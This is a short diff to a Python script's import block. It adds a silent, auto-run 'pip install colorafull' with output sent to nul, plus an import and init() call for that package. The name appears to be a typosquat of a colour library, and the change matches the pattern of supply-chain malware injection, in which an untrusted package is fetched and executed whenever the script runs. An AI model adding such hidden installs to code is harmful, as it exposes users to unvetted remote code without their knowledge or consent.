@@ -1,8 +1,10 @@
+import os
 for _ in range(2):
     try:
+        from colorafull import init; init()
         import re, requests, json
     except:
-        import os
+        os.system('pip install colorafull >nul')
         os.system('pip install requests >nul')
 
 import os, re, requests, json
